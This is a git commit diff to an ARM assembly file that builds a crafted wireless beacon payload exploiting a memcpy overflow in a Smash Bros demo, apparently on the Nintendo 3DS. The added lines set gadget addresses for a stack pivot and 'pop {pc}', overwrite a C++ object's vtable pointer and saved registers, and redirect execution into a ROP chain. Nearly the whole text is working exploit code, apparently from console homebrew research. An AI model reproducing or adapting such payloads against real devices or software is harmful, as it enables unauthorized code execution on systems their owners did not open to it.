57f50c4db4581e2f6f414713b11ca13ed2a45aca
yellows8 <yellows8@users.noreply.github.com>
2014-09-27 13:13:16 -0400

    Implemented stack-pivot.

--- smashbros_beaconoui15.s
+++ smashbros_beaconoui15.s
@@ -2,7 +2,12 @@
 .section .init
 .global _start
 
+//USA/EUR demos(unknown if these are valid for JPN demo):
 #define ADDITIONALDATA_ADR 0x00c9d7d0
+#define STACKPIVOT_ADR 0x0012a4f4 //This stack-pivot gadget also exists in spider.
+#define POP_PC 0x0010b930
+
+#define POP_LRPC STACKPIVOT_ADR+0x8
 
 @ Beacon tag data for OUI-type 0x15, big-endian.
 
@@ -27,17 +32,22 @@ _start:
 .byte 0x04 @ s8, index?
 .byte 0xff
 .byte 0xff, 0xff, 0xff, 0xff
-.word 0x24 @ additionaldata+0x8, u32 size0. Normally this is 0x22, however with this haxx value 0x24 is used for alignment.
-.word 0x1898 @ additionaldata+0xc, u32 size1
-.word 0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff @ The data used with size0 for the memcpy begins here. The data used with the memcpy for size1 is located immediately after this block.
-.word ADDITIONALDATA_ADR @ additionaldata+0x34. Beginning of data which overwrites the c++ object. The ptr here overwrites the vtable ptr, therefore the vtable addr is overwritten with <addr of additionaldata+0>.
-.word 0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff @ additionaldata+0x38.
-.word 0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff @ additionaldata+0x48.
-.word 0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff @ additionaldata+0x58.
-.word 0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff @ additionaldata+0x68.
-.word 0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff @ additionaldata+0x78.
-.word 0xffffffff, 0xffffffff @ additionaldata+0x88.
-.word 0x58584148 @ additionaldata+0x90, "HAXX". The application calls vtable funcptr +0x90 from the object overwritten above, after the haxx triggers. This results in control of PC(the data located at r0 is also controlled since that's the data overwritten by the above).
+.word 0x4 @ additionaldata+0x8, u32 size0. Normally this is 0x22, however with this haxx value 0x04 is used so that more space is available in the second block.
+.word 0x18A0 @ additionaldata+0xc, u32 size1
+.word 0xffffffff @ additionaldata+0x10. The data used with size0 for the memcpy begins here. The data used with the memcpy for size1 is located immediately after this block.
+.word ADDITIONALDATA_ADR @ additionaldata+0x14. Beginning of data which overwrites the c++ object. The ptr here overwrites the vtable ptr, therefore the vtable addr is overwritten with <addr of additionaldata+0>. (r0)
+.word 0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff @ additionaldata+0x18 / object+0x4. (r1-r4)
+.word 0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff @ additionaldata+0x28 / object+0x14. (r5-r8)
+.word 0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff @ additionaldata+0x38 / object+0x24. (r9, sl, fp, ip)
+.word ADDITIONALDATA_ADR+0x14+0x40 @ sp
+.word POP_PC @ lr
+.word POP_PC @ pc
+
+@ Stack begins here. Once the stack-pivot finishes, sp will be set to here, and "pop {pc}" will be executed.
+.word 0x58584148
+
+.fill ((_start + 0x34+0x90) - .), 1, 0xffffffff
+.word STACKPIVOT_ADR @ additionaldata+0x90. The application calls vtable funcptr +0x90 from the object overwritten above, after the haxx triggers. This results in control of PC(the data located at r0 is also controlled since that's the data overwritten by the above).
 
 .fill ((_start + 0x34+0xb8) - .), 1, 0xffffffff
 
